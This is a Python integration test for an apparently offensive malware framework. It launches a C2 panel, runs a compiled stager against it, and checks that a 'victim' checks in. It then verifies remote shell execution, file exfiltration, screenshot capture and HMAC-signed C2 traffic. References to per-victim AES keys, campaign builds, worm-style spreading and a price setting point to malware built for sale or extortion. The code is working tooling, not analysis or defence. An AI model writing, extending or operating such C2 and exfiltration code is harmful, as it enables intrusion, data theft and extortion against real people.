#!/usr/bin/env python3
"""Live end-to-end test: real payload -> real HTTP C2 -> command -> exfil.

Starts the panel on a throwaway database, runs the packed stager against it
with --c2, verifies checkin, executes a shell command, then exfiltrates a file
and checks the stored bytes.

Requires: elevated shell (payload refuses to run unelevated), MSVC build done.
"""

import base64
import urllib.error
import os
import random
import shutil
import socket
import sqlite3
import subprocess
import sys
import tempfile
import time
import urllib.parse
import urllib.request

ROOT = r"D:\Vexpayload"
STAGER = os.path.join(ROOT, "x64", "Release", "stager.exe")
PY = sys.executable
BASE = tempfile.mkdtemp(prefix="vex_e2e_live_")
DB = os.path.join(BASE, "c2.db")
CHECKS = []


def ok(name, cond, extra=""):
    CHECKS.append((name, bool(cond)))
    print(("PASS " if cond else "FAIL ") + name + ((" " + str(extra)) if extra else ""))


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def wait_port(port, timeout=20):
    end = time.time() + timeout
    while time.time() < end:
        try:
            with socket.create_connection(("127.0.0.1", port), 0.5):
                return True
        except OSError:
            time.sleep(0.2)
    return False


def dbrow(sql, params=()):
    conn = sqlite3.connect(DB, timeout=10)
    conn.row_factory = sqlite3.Row
    try:
        return conn.execute(sql, params).fetchone()
    finally:
        conn.close()


def dbexec(sql, params=()):
    conn = sqlite3.connect(DB, timeout=10)
    try:
        conn.execute(sql, params)
        conn.commit()
    finally:
        conn.close()


def main() -> int:
    if os.environ.get("VEX_ALLOW_PAYLOAD") != "1":
        print("[-] refusing to execute the compiled payload on this host")
        print("    set VEX_ALLOW_PAYLOAD=1 only in a lab/VM")
        sys.exit(2)

    # The payload is launched with --no-elevate for this test; no admin needed.
    if not os.path.exists(STAGER):
        print("[-] stager not built")
        return 2

    port = free_port()
    # Keep payload state out of the real %ProgramData%\VEX. Otherwise the
    # e2e checkin writes a test secret over an installed payload's secret.
    state_root = os.path.join(BASE, "programdata")
    os.makedirs(state_root, exist_ok=True)
    stager_env = dict(os.environ)
    stager_env["ProgramData"] = state_root
    env = dict(os.environ)
    env.update({
        "VEX_DB": DB,
        "VEX_PASS": "e2e-admin-pass",
        "VEX_MASTER": "e2e-master-passphrase",
        "VEX_SECRET": "e" * 64,
        "VEX_PRIV": os.path.join(ROOT, "VexC2", "priv.pem"),
        "PORT": str(port),
        "VEX_HOST": "127.0.0.1",
        "VEX_UPLOADS": os.path.join(BASE, "uploads"),
        "VEX_DEBUG_SIG": "1",
    })

    # Seed the token before the panel starts.
    sys.path.insert(0, os.path.join(ROOT, "VexC2"))
    os.environ.update({k: env[k] for k in ("VEX_DB", "VEX_MASTER", "VEX_UPLOADS",
                                           "VEX_PASS", "VEX_PRIV", "VEX_SECRET")})
    import c2db  # noqa: E402
    import vault  # noqa: E402
    c2db.init_db()
    c2db.set_setting("api_token", "")
    c2db.set_setting("price_usd", "100")

    panel_log = open(os.path.join(BASE, "panel.log"), "wb")
    panel = subprocess.Popen([PY, "-u", os.path.join(ROOT, "VexC2", "run_prod.py")],
                             cwd=os.path.join(ROOT, "VexC2"), env=env,
                             stdout=panel_log, stderr=panel_log)
    try:
        ok("panel up", wait_port(port))
        base = f"http://127.0.0.1:{port}"

        # Default build ships no API token; a campaign build must set one.
        ok("api token default empty", c2db.get_setting("api_token", "") == "")

        stager = subprocess.Popen([STAGER, "--no-elevate", "--no-persist",
                                   "--no-spread", "--ping-ms", "2000",
                                   "--c2", base], env=stager_env,
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            vid = None
            end = time.time() + 90
            while time.time() < end and not vid:
                row = dbrow("SELECT vid FROM victims LIMIT 1")
                if row:
                    vid = row["vid"]
                time.sleep(0.5)
            ok("payload checked in", bool(vid), vid)
            if not vid:
                return 1

            v = dbrow("SELECT * FROM victims WHERE vid=?", (vid,))
            ok("key sealed at rest", (v["aes_key"] or "").startswith("enc:v1:"),
               f"aes={len(v['aes_key'] or '')}B wrapped={len(v['wrapped_key'] or '')}B")
            if not (v["aes_key"] or "").startswith("enc:v1:"):
                panel_log.flush()
                with open(os.path.join(BASE, "panel.log"), "rb") as f:
                    print("PANEL LOG:", f.read()[-1200:].decode("utf-8", "replace"))

            # shell round-trip through the real ping/dispatch path
            c2db.queue_command(vid, "shell", "whoami")
            end = time.time() + 90
            status, out = None, ""
            while time.time() < end:
                row = dbrow("SELECT status, output FROM commands WHERE vid=? "
                            "AND ctype='shell' ORDER BY id DESC LIMIT 1", (vid,))
                if row and row["status"] in ("done", "failed"):
                    status, out = row["status"], row["output"] or ""
                    break
                time.sleep(0.5)
            ok("shell executed", status == "done" and len(out.strip()) > 0,
               f"{status} {out[:60]!r}")
            # Give the command loop a beat before the next dispatch; the panel
            # and payload both poll, and a busy CI host can otherwise race.
            time.sleep(2)
            if status != "done":
                v2 = dbrow("SELECT last_ping, secret, status FROM victims WHERE vid=?", (vid,))
                c2 = dbrow("SELECT status FROM commands WHERE vid=? ORDER BY id DESC LIMIT 1", (vid,))
                print("DIAG victim:", dict(v2) if v2 else None, "cmd:", dict(c2) if c2 else None)
                time.sleep(3)
                v3 = dbrow("SELECT last_ping FROM victims WHERE vid=?", (vid,))
                print("DIAG last_ping after wait:", v3["last_ping"] if v3 else None)
                panel_log.flush()
                with open(os.path.join(BASE, "panel.log"), "rb") as f:
                    print("PANEL LOG:", f.read()[-2500:].decode("utf-8", "replace"))

            # exfil a file and compare bytes on disk
            payload = os.urandom(2 * 1024 * 1024 + 12345)
            src = os.path.join(BASE, "secret.bin")
            with open(src, "wb") as f:
                f.write(payload)
            c2db.queue_command(vid, "exfil", src)
            end = time.time() + 180
            row = None
            while time.time() < end:
                row = dbrow("SELECT * FROM uploads WHERE vid=? ORDER BY id DESC LIMIT 1",
                            (vid,))
                if row:
                    break
                time.sleep(0.5)
            ok("exfil stored", bool(row), row["name"] if row else "")
            if not row:
                cmd = dbrow("SELECT id, status, output FROM commands WHERE vid=? "
                            "AND ctype='exfil' ORDER BY id DESC LIMIT 1", (vid,))
                print("DIAG exfil command:", dict(cmd) if cmd else None)
                panel_log.flush()
                try:
                    with open(os.path.join(BASE, "panel.log"), "rb") as f:
                        print("PANEL LOG:", f.read()[-4000:].decode("utf-8", "replace"))
                except OSError:
                    pass
            if row:
                with open(row["path"], "rb") as f:
                    got = f.read()
                ok("exfil bytes identical", got == payload,
                   f"{len(got)} vs {len(payload)}")
            # signed-protocol negative tests
            import hashlib as _h, hmac as _m
            sec_b64 = vault.reveal(dbrow("SELECT secret FROM victims WHERE vid=?",
                                         (vid,))["secret"])
            key = base64.b64decode(sec_b64)

            def ping_status(headers):
                url = base + "/api/ping?vid=" + urllib.parse.quote(vid)
                req = urllib.request.Request(url, headers=headers)
                try:
                    return urllib.request.urlopen(req, timeout=5).status
                except urllib.error.HTTPError as exc:
                    return exc.code

            now = int(time.time())
            good = str(now)
            mac = _m.new(key, f"{good}|/api/ping|".encode(), _h.sha256).hexdigest()
            ok("signed ping accepted",
               ping_status({"X-Vex-Ts": good, "X-Vex-Sig": mac,
                            "X-Vex-Token": "vex-e2e-token"}) == 200)
            ok("bad signature rejected",
               ping_status({"X-Vex-Ts": str(now), "X-Vex-Sig": "0" * 64,
                            "X-Vex-Token": "vex-e2e-token"}) == 403)
            old = str(now - 200)
            old_mac = _m.new(key, f"{old}|/api/ping|".encode(), _h.sha256).hexdigest()
            ok("replay rejected",
               ping_status({"X-Vex-Ts": old, "X-Vex-Sig": old_mac,
                            "X-Vex-Token": "vex-e2e-token"}) == 403)

            # screenshot round-trip (GDI capture -> chunked upload)
            c2db.queue_command(vid, "screenshot", "")
            end = time.time() + 180
            shot = None
            while time.time() < end:
                shot = dbrow("SELECT * FROM uploads WHERE vid=? AND name='screenshot.bmp' "
                             "ORDER BY id DESC LIMIT 1", (vid,))
                if shot:
                    break
                time.sleep(0.5)
            ok("screenshot stored", bool(shot) and (shot["size"] or 0) > 10000,
               shot["size"] if shot else "")
            if not shot:
                cmd = dbrow("SELECT id, status, output FROM commands WHERE vid=? "
                            "AND ctype='screenshot' ORDER BY id DESC LIMIT 1", (vid,))
                print("DIAG screenshot command:", dict(cmd) if cmd else None)

            return 0
        finally:
            stager.terminate()
            try:
                stager.wait(timeout=10)
            except subprocess.TimeoutExpired:
                stager.kill()
    finally:
        panel.terminate()
        try:
            panel.wait(timeout=10)
        except subprocess.TimeoutExpired:
            panel.kill()


if __name__ == "__main__":
    rc = 0
    try:
        rc = main()
    finally:
        bad = [n for n, s in CHECKS if not s]
        print(f"\n{len(CHECKS) - len(bad)}/{len(CHECKS)} checks passed")
        shutil.rmtree(BASE, ignore_errors=True)
    if rc:
        sys.exit(rc)
    sys.exit(0 if CHECKS and not bad else 1)
